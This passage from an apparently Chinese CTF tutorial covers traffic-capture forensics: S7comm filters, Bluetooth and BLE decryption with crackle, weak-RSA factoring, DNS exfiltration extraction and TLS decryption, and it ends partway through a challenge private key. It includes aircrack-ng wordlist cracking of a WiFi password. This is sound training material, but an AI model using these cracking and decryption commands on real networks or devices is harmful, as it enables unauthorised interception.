<a href=#%e4%be%8b%e9%a2%982-2020icsc%e6%b5%8e%e5%8d%97%e7%ab%99%e8%a2%ab%e7%af%a1%e6%94%b9%e7%9a%84%e6%95%b0%e6%8d%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>翻看流量包，发现很多 S7COMM 数据包，使用过滤器过滤，发现 s7comm.resp.data 字段传了很多 66 数据
使用过滤器过滤出传了 s7comm.resp.data 字段数据但数据不是 66 的 S7 数据包
发现了疑似 flag 的数据，为了防止 flag 中含有 f 字符而被过滤
因此我们使用下面这个过滤命令进行过滤，然后导出特定分组</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>(((</span><span class=n>frame</span><span class=o>.</span><span class=n>number</span> <span class=o>&gt;=</span> <span class=mi>19987</span> <span class=o>&amp;&amp;</span> <span class=n>frame</span><span class=o>.</span><span class=n>number</span> <span class=o>&lt;=</span><span class=mi>20032</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>_ws</span><span class=o>.</span><span class=n>col</span><span class=o>.</span><span class=n>protocol</span> <span class=o>==</span> <span class=s2>&#34;S7COMM&#34;</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>param</span><span class=o>.</span><span class=k>func</span> <span class=o>==</span> <span class=mh>0x05</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>resp</span><span class=o>.</span><span class=n>data</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>最后 tshark 提取出数据，然后十六进制解码即可得到 flag：flag{93137ad4a}</p><h4 class=heading-element id=例题3-枢网智盾2021异常流分析><span>例题3 枢网智盾2021—异常流分析</span>
<a href=#%e4%be%8b%e9%a2%983-%e6%9e%a2%e7%bd%91%e6%99%ba%e7%9b%be2021%e5%bc%82%e5%b8%b8%e6%b5%81%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>打开流量包，发现很多 S7comm 流量，然后稍微过滤一下，发现是写入数据的流量
然后写入的数据几乎都是 ffff 开头的，因此我们直接查看不是 ffff 开头的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>((</span><span class=n>_ws</span><span class=o>.</span><span class=n>col</span><span class=o>.</span><span class=n>protocol</span> <span class=o>==</span> <span class=s2>&#34;S7COMM&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>param</span><span class=o>.</span><span class=k>func</span> <span class=o>==</span> <span class=mh>0x05</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>resp</span><span class=o>.</span><span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>]</span> <span class=o>!=</span> <span class=n>ff</span><span class=p>:</span><span class=n>ff</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>即可得到 flag：flag{ffad28a0ce69db34751f}</p><h4 class=heading-element id=例题4-枢网智盾2021工控协议分析><span>例题4 枢网智盾2021—工控协议分析</span>
<a href=#%e4%be%8b%e9%a2%984-%e6%9e%a2%e7%bd%91%e6%99%ba%e7%9b%be2021%e5%b7%a5%e6%8e%a7%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(_ws.col.protocol == &#34;S7COMM&#34;) &amp;&amp; (frame.number == 418)</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20240430135813366.png alt=/posts/5422d65/imgs/image-20240430135813366.png height=1600 width=2560>
然后直接把明文传输的数据 base64 解码即可
<img loading=lazy src=/posts/5422d65/imgs/image-20240430135958048.png alt=/posts/5422d65/imgs/image-20240430135958048.png height=1225 width=2292>
flag{hncome66!}</p><h2 class=heading-element id=蓝牙流量分析><span>蓝牙流量分析</span>
<a href=#%e8%93%9d%e7%89%99%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=obex协议><span>OBEX协议</span>
<a href=#obex%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>过滤器中输入<code>OBEX</code>，然后导出传输的压缩包，然后再在搜索中输入<code>PIN Code</code>选择分组列表和字符串即可找到解压密码</p><h3 class=heading-element id=att协议><span>ATT协议</span>
<a href=#att%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>例题1-low_energy_crypto</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 先用tshark导出公钥，并把公钥另存为pub.key</span>
</span></span><span class=line><span class=cl>tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_rx -Y <span class=s1>&#39;btatt.opcode == 0x1b&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> <span class=p>|</span> uniq &gt; data.txt
</span></span><span class=line><span class=cl><span class=c1># 然后用tshark导出密文，这里的数据如果不是十六进制，用tshark提有时候会出问题，可以手提</span>
</span></span><span class=line><span class=cl>tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y <span class=s1>&#39;btatt.opcode == 0x12&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> <span class=p>|</span> uniq &gt; enc.txt
</span></span><span class=line><span class=cl><span class=c1># 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了，这里的密文后面如果有多余\x00，可以用010手动去除，要不然可能解密失败</span>
</span></span><span class=line><span class=cl>python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc.txt</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20241202135717254.png alt=/posts/5422d65/imgs/image-20241202135717254.png height=498 width=1599></p><p>例题2-BLE_crypto</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 先用tshark导出公钥，并把公钥另存为pub.key，这里如果是十六进制，需要CyberChef转换一下先</span>
</span></span><span class=line><span class=cl>tshark -r BLE_crypto.pcapng -T fields -e btatt.value -Y <span class=s1>&#39;btatt.opcode&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># 然后用tshark导出密文，如果是十六进制，需要CyberChef转换一下先</span>
</span></span><span class=line><span class=cl>tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y <span class=s1>&#39;btatt.opcode == 0x12&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> <span class=p>|</span> uniq &gt; enc.txt
</span></span><span class=line><span class=cl><span class=c1># 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了</span>
</span></span><span class=line><span class=cl>python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20241202140503314.png alt=/posts/5422d65/imgs/image-20241202140503314.png height=571 width=1889></p><p><strong>手动解析RSA公钥，并爆破生成私钥：</strong></p><ol><li>解析公钥: <code>openssl rsa -in pub.key -text -inform PEM -pubin</code></li></ol><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226232852559.png alt=/posts/5422d65/imgs/image-20250226232852559.png height=635 width=1734></p><ol start=2><li>十六进制转十进制并分解n</li></ol><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226233215942.png alt=/posts/5422d65/imgs/image-20250226233215942.png height=867 width=2560></p><ol start=3><li>使用 rsatool.py 导出私钥 priv.key</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python rsatool.py -p <span class=m>7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527</span> -q <span class=m>7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221</span> -e <span class=m>65537</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226233503658.png alt=/posts/5422d65/imgs/image-20250226233503658.png height=1236 width=2560></p><ol start=4><li>使用私钥来解密密文</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>openssl rsautl -decrypt -raw -inkey priv.key -in flag
</span></span><span class=line><span class=cl>openssl pkeyutl -decrypt -in flag -out decrypted_flag -inkey priv.key</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=smp协议><span>SMP协议</span>
<a href=#smp%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>SMP协议的全称是Secure Manager Protocol，用来定义蓝牙的配对和密钥的分发</p><p>配对完成后传输的数据是加密的，我们需要用(Crakle)[https://github.com/mikeryan/crackle]这个项目进行解密</p><blockquote><p>这里老版本的可能有点问题，建议去pr中找一下新版的安装</p><p>参考链接：https://cloud.tencent.com/developer/article/2159878</p></blockquote><p>安装好项目后直接运行一下命令解密流量包即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>crackle -i uploads_2022_04_11_h5kAcZEg_ble.pcapng -o dec.pcapng</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20241202141020218.png alt=/posts/5422d65/imgs/image-20241202141020218.png height=387 width=643></p><p>SMP协议解密完成后，我们可以在ATT协议中发现传输的数据，用以下命令导出</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r dec.pcapng -T fields -e btatt.value -Y <span class=s1>&#39;btatt.opcode == 0x52&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span></span></span></code></pre></td></tr></table></div></div><p>然后CyberChef将得到的十六进制数据转换一下即可得到flag：<code>flag{9ba3973652c0ee073652c0ee0c76ca6cb36441bd40}</code></p><h2 class=heading-element id=邮件stmp流量分析><span>邮件(STMP)流量分析</span>
<a href=#%e9%82%ae%e4%bb%b6stmp%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>可以试试看导出对象-导出IMF-导出文件的后缀是eml（可以使用网易邮箱大师打开）</p><p>eml文件是将数据base64编码后再传输的，有些数据直接用邮箱软件打开可能看不到，建议手搓一遍</p><h2 class=heading-element id=无线流量分析><span>无线流量分析</span>
<a href=#%e6%97%a0%e7%ba%bf%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>在kali中用弱口令密码爆破出WIFI密码</p><p>执行命令：<code>aircrack-ng ctf.pcap -w rockyou.txt</code></p><p>执行命令解码：<code>airdecap-ng -p password1 ctf.pcap -e ctf -o 1.pcap</code></p><p>然后打开解码后的文件，查找flag</p><h2 class=heading-element id=dns流量分析><span>DNS流量分析</span>
<a href=#dns%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=dnslog外带的流量><span>DNSlog外带的流量</span>
<a href=#dnslog%e5%a4%96%e5%b8%a6%e7%9a%84%e6%b5%81%e9%87%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p><img loading=lazy src=/posts/5422d65/imgs/image-20241120165643159.png alt=/posts/5422d65/imgs/image-20241120165643159.png height=1032 width=1920></p><p>直接使用tshark导出DNS外带的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r 1.pcap -T fields -e dns.qry.name -Y <span class=s1>&#39; ip.dst == 8.8.8.8 &amp;&amp; dns.qry.type == 1&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> <span class=p>|</span> uniq &gt; data.txt</span></span></code></pre></td></tr></table></div></div><p>例题1-攻防世界 MISC - tunnel</p><h3 class=heading-element id=数据以二进制藏在dns各种解析记录中><span>数据以二进制藏在DNS各种解析记录中</span>
<a href=#%e6%95%b0%e6%8d%ae%e4%bb%a5%e4%ba%8c%e8%bf%9b%e5%88%b6%e8%97%8f%e5%9c%a8dns%e5%90%84%e7%a7%8d%e8%a7%a3%e6%9e%90%e8%ae%b0%e5%bd%95%e4%b8%ad class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>这种情况下有时候需要分IP导出数据</p><blockquote><p>DNS记录类型，常用的有：</p><p>A：A记录，指向别名或IPv4地址。</p><p>AAAA：IPv6地址解析。</p><p>NS：解析服务器记录。</p><p>MX：邮件交换记录。</p><p>CNAME：别名。</p><p>txt：为某个主机名或域名设置的说明。</p><p>PTR：指针记录，PTR记录是A记录的逆向记录。</p><p>SOA：标记一个区的开始，起始授权机构记录</p></blockquote><p>例题1-2024国赛-Toug_DNS</p><h3 class=heading-element id=信息以二进制藏在端口号末尾中><span>信息以二进制藏在端口号末尾中</span>
<a href=#%e4%bf%a1%e6%81%af%e4%bb%a5%e4%ba%8c%e8%bf%9b%e5%88%b6%e8%97%8f%e5%9c%a8%e7%ab%af%e5%8f%a3%e5%8f%b7%e6%9c%ab%e5%b0%be%e4%b8%ad class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h2 class=heading-element id=slltls加密流量分析><span>SLL、TLS加密流量分析</span>
<a href=#slltls%e5%8a%a0%e5%af%86%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><blockquote><p>老版本的 wireshark 中显示的是 SSL，新版本的改成TLS了</p></blockquote><p>解密方法就是点击 编辑 -> 首选项 -> Protocols -> TLS <code>加载 RSA 私钥</code> 或者 <code>加载日志文件((Pre)-Master-Secret log)</code></p><p>解完密后就和平常的流量分析一样了</p><p>例题1-BUU 第九章TLS流量分析</p><p>打开流量包发现有 TLS 数据包，然后还有一些红黑条纹，猜测是被加密了</p><p>翻看流量包，追踪 TCP 流，发现流7中POST了一个 sslkey.log 日志文件</p><p><img loading=lazy src=/posts/5422d65/imgs/N7.png alt=/posts/5422d65/imgs/N7.png height=2158 width=3836></p><p>导出 sslkey.log 日志文件，然后按上面的步骤导入解密</p><p><img loading=lazy src=/posts/5422d65/imgs/N8.png alt=/posts/5422d65/imgs/N8.png height=2160 width=3838></p><p>解密完后直接搜索 flag{ 字符串即可找到 flag{e3364403651e775bfb9b3ffa06b69994}</p><p><img loading=lazy src=/posts/5422d65/imgs/N9.png alt=/posts/5422d65/imgs/N9.png height=2160 width=3840></p><p>例题-DDCTF2018 流量分析</p><p>直接在 TLS 加载 RSA 私钥解密即可</p><p>私钥的格式如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ
</span></span><span class=line><span class=cl>LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO
</span></span><span class=line><span class=cl>vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB
</span></span><span class=line><span class=cl>AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4
</span></span><span class=line><span class=cl>QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/
</span></span><span class=line><span class=cl>QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN
</span></span><span class=line><span class=cl>czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ
</span></span><span class=line><span class=cl>ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9
